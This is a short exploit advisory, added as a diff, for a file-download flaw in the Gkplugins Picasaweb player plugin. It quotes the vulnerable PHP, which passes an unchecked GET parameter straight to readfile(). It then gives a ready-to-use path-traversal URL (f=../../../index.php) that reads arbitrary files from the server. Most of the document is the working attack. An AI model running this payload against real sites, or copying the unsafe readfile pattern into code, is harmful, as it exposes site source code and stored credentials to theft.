@@ -1,0 +1,30 @@
+# Exploit Title: Gkplugins Picasaweb Download File
+# Date : 2015-08-13
+# Exploit Author : TMT [VNhgroup]
+# Vendor Homepage: https://gkplugins.com/
+# Tested on: Windows 7
+
+File
+------------------------
+$fileout = $_GET['f']; <--  can you download file
+$filelength = $_GET['l'];
+$filestream = $_GET['start'];
+if($fileout!=""){
+	$fileout = urldecode($fileout);
+	$filelength = urldecode($filelength);
+	if($filestream!=""){
+		$filelength -= $filestream;
+		$filestream = "?start=".$filestream;
+	}
+	header('Content-Type: application/octet-stream');
+	header('Content-Length: ' . $filelength);
+	readfile($fileout.$filestream);
+}else{
+	$text = get_curl($link); 
+	echo $text;
+}
+
+------------------------------
+Exploit Code:
+site.com/plugins/gkplugins_picasaweb/plugins/plugins_player.php?f=../../../index.php
+
